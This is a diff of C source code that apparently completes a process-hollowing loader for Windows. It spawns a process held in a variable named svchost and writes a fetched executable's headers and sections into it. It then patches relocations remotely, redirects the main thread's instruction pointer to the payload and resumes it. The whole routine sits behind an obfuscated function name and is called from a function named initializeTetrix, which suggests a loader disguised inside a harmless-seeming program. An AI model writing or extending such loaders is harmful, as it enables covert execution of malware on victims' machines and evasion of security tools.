@@ -7,7 +7,7 @@
 #include "ntdll_imit.h"
 #include "config.h"
 
-HANDLE spawn(){
+PROCESS_INFORMATION spawn(){
 STARTUPINFOA stInfo={0};
 stInfo.cb=sizeof(stInfo);
 PROCESS_INFORMATION pInfo;
@@ -23,7 +23,7 @@ NULL,
 &stInfo,
 &pInfo
 ))
-return pInfo.hProcess;
+return pInfo;
 else
 printf("[-] CreateProcessA %lu\n",GetLastError());
 exit(1);
@@ -98,75 +98,75 @@ MappingMetadata PEParser(BYTE* pe){
     unsigned long dataDirectoriesCount=*(unsigned long*)(p_OPT_HEADERS+0x6c);
     // important
     mm.ImageSectionsCount=*(unsigned short*)(p_FILE_HEADERS+0x2);
-    unsigned short optHeadersSz=(*unsigned short*)(p_FILE_HEADERS+0x10);
+    unsigned short optHeadersSz=*(unsigned short*)(p_FILE_HEADERS+0x10);
 
     // sizeof(IMAGE_SECTION_HEADER) = 40 bytes
     IMAGE_SECTION_HEADER* p_SECTION_HEADER=(IMAGE_SECTION_HEADER*)(p_NT_HEADERS+0x4+0x14+optHeadersSz);
-    mm.ImageSectionHeaders=(unsigned long  long )p_SECTION_HEADER;
-
+    mm.ImageSectionHeaders=(unsigned long long )p_SECTION_HEADER;
+    
     return mm;
 }
 
 // section object mappnig approach
-void mapRoutine(){
-HANDLE pe_headers_section;
-NtCreateSection(
-&pe_headers_section,
-SECTION_ALL_ACCESS,
-NULL,
-mm.headersSize,
-PAGE_READWRITE,
-SEC_COMMIT,
-NULL
-);
-if(!pe_headers_section){
-    printf("[-]NtCreateSection for PE HEADERS MAPPNG!\n");
-    exit(1);
-}
+// void mapRoutine(){
+// HANDLE pe_headers_section;
+// NtCreateSection(
+// &pe_headers_section,
+// SECTION_ALL_ACCESS,
+// NULL,
+// mm.headersSize,
+// PAGE_READWRITE,
+// SEC_COMMIT,
+// NULL
+// );
+// if(!pe_headers_section){
+//     printf("[-]NtCreateSection for PE HEADERS MAPPNG!\n");
+//     exit(1);
+// }
 
-void* mapped=NULL;
-if(NtMapViewOfSection(
-    pe_headers_section,
-    self,
-    mapped,
-    0,
-    0,
-    NULL,
-    (unsigned long*)&mm.headersSize,
-    PAGE_READWRITE
-)!=0 && !mapped){
-    printf("[-] NtMapViewOfSection. 168\n");
-    exit(1);
-}
-memcpy(mapped,mm.heapBase,mm.headersSize);
+// void* mapped=NULL;
+// if(NtMapViewOfSection(
+//     pe_headers_section,
+//     self,
+//     mapped,
+//     0,
+//     0,
+//     NULL,
+//     (unsigned long*)&mm.headersSize,
+//     PAGE_READWRITE
+// )!=0 && !mapped){
+//     printf("[-] NtMapViewOfSection. 168\n");
+//     exit(1);
+// }
+// memcpy(mapped,mm.heapBase,mm.headersSize);
 
-void *remoteBase=NULL;
-if(NtMapViewOfSection(
-    pe_headers_section,
-    proc,  
-    remoteBase
-    0,
-    0,
-    NULL,
-    (unsigned long*)&mm.headersSize,
-    PAGE_READWRITE
-)!=0 && !mapped){
-    printf("[-] NtMapViewOfSection. 168\n");
-    exit(1);
-}
-}
+// void *remoteBase=NULL;
+// if(NtMapViewOfSection(
+//     pe_headers_section,
+//     proc,  
+//     remoteBase
+//     0,
+//     0,
+//     NULL,
+//     (unsigned long*)&mm.headersSize,
+//     PAGE_READWRITE
+// )!=0 && !mapped){
+//     printf("[-] NtMapViewOfSection. 168\n");
+//     exit(1);
+// }
+// }
 
 
-void rellocate(void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
+void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
     BYTE* relocBlockHeapVIew=(BYTE*)(heapBase+(unsigned int)(sec->PointerToRawData));
     unsigned int secSz=sec->SizeOfRawData;
-
+    long long delta=(unsigned long long)remoteImageBase-(unsigned long long)preferedBase;
     for(int i=0;i<secSz;i++){
-        IMAGE_BASE_RELOCATION* block=relocBlockHeapVIew;
+        IMAGE_BASE_RELOCATION* block=(IMAGE_BASE_RELOCATION*)relocBlockHeapVIew;
         unsigned int blockSz=block->SizeOfBlock;
         // rva to image base
         unsigned int pageRva=block->VirtualAddress;
-        void* page=remoteImageBase+pageRva;
+        uintptr_t page=(uintptr_t)(remoteImageBase+pageRva);
         unsigned int entriesCount=(blockSz-sizeof(unsigned int)*2)/2;
 
         WORD* entry=(WORD*)((BYTE*)block+8);
@@ -174,17 +174,17 @@ void rellocate(void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SEC
             BYTE relocType=*entry>>12;
             WORD offset=*entry & 0x0FFF;
             if(relocType==3 || relocType==10){
-                void* shesasworebeli=(BYTE*)page+offset;
-                
-                if((unsigned long long)remoteImageBase>(unsigned long long)preferedBase)
-                {
-                    unsigned long long corrected=((unsigned long long)remoteImageBase-(unsigned long long)preferedBase)+((unsigned long long)*shesasworebeli-(unsigned long long)preferedBase);
-                    *shesasworebeli=corrected;
-                }
-                else
-                {
-                    unsigned long long corrected=((unsigned long long)*shesasworebeli-(unsigned long long)preferedBase)-((unsigned long long)remoteImageBase-(unsigned long long)preferedBase);
-                    *shesasworebeli=corrected;
+                uintptr_t absolute=page+offset;
+                uintptr_t relocated=(uintptr_t)((absolute-(uintptr_t)preferedBase)+delta);
+                if(!WriteProcessMemory(
+                    proc,
+                    (void*)absolute,
+                    &relocated,
+                    sizeof(uintptr_t),
+                    NULL
+                )){
+                    printf("[-] 186!\n");
+                    exit(1);
                 }
             }
             entry+=2;
@@ -193,11 +193,9 @@ void rellocate(void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SEC
         relocBlockHeapVIew+=blockSz;
     }
 
-
-
 }
 
-bool hallowAndStart(HANDLE proc,BYTE* pe){
+bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
 HANDLE self=GetCurrentProcess();
 HMODULE ntdll=GetModuleHandleA("ntdll");
 T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
@@ -243,12 +241,12 @@ WriteProcessMemory(
     proc,
     remoteV,
     mm.heapBase,
-    mm.headersSize
+    mm.headersSize,
     NULL
 );
 
 // sec -> heap
-IMAGE_SECTION_HEADER* sec=mm.ImageSectionHeaders+_offset;
+IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
 unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE
 
 IMAGE_SECTION_HEADER *reloc=NULL;
@@ -265,12 +263,12 @@ unsigned int rva_virt=sec->VirtualAddress;
 unsigned int secSz=sec->SizeOfRawData;
 void* va=remoteV+rva_virt;
 void* raw=mm.heapBase+rva_virt;
-unsigned long written=0;
+unsigned long long written=0;
 WriteProcessMemory(
     proc,
     va,
     raw,
-    secSz
+    secSz,
     &written
 );
 if(written!=(unsigned long)secSz){
@@ -279,18 +277,34 @@ if(written!=(unsigned long)secSz){
 }
 sec++;
 }
-if(mm.preferedBase!=(unsigned long long)remoteV)
-    rellocate(remoteV,mm.heapBase,mm.preferedBase,reloc);
 
+if(mm.preferedBase!=(unsigned long long)remoteV)
+    rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);
+
+
+uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
+CONTEXT thContext;
+if(!GetThreadContext(thread,&thContext))
+    printf("[-] 288!\n");
+    
+thContext.Rip=(DWORD64)entryPont;
+if(!SetThreadContext(thread,&thContext))
+    printf("[-] 293!\n");
+
+if(ResumeThread(thread)!=-1)
+    return true;
+return false;
 }
 
 bool __0x1FN3C3SS4RY__(){
-    HANDLE svchost=spawn();
+    PROCESS_INFORMATION pinfo=spawn();
+    HANDLE svchost=pinfo.hProcess;
+    HANDLE svchostMainThread=pinfo.hThread;
     BYTE* pe=fetchPE(); // returns heap base 
-    bool cool=hallowAndStart(svchost,pe);
+    bool cool=hallowAndStart(svchost,svchostMainThread,pe);
     if(cool)
         return true;
-    return false;
+    exit(1);
 }
 bool initializeTetrix(){
   return __0x1FN3C3SS4RY__();
